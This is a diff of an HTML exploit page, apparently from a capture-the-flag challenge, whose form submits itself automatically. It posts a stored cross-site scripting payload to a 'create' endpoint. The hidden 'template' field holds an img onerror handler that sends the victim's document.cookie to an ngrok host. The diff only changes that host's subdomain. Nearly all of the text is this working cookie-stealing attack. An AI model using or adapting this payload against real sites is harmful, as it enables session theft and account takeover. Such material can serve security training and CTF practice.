@@ -4,7 +4,7 @@
 <h1>Loading...</h1>
 <form id="f" action="http://web:3000/create" method="POST">
     <input type="hidden" name="title" value="xss" />
-    <input type="hidden" name="template" value="<img src=x onerror='new Image().src=`https://a7ca5d84294b.ngrok-free.app?c=${document.cookie}`'>" />
+    <input type="hidden" name="template" value="<img src=x onerror='new Image().src=`https://45b5706b1f75.ngrok-free.app/?c=${document.cookie}`'>" />
     <input type="hidden" name="answers" value="😃😃😃😃😃😃😃😃" />
 </form>
 <script>
